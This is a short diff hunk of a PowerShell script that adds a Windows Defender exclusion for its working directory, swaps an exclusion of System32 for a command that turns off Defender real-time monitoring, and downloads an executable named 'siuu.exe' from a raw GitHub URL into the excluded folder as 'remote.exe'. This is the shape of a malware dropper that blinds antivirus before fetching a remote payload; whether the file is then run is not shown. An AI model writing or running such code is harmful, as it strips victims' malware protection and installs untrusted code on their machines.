@@ -27,7 +27,8 @@ New-Item -ItemType Directory -Path $temp
 
 
 Add-MpPreference -ExclusionPath $dir
-Add-MpPreference -ExclusionPath "C:\Windows\System32\"
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"
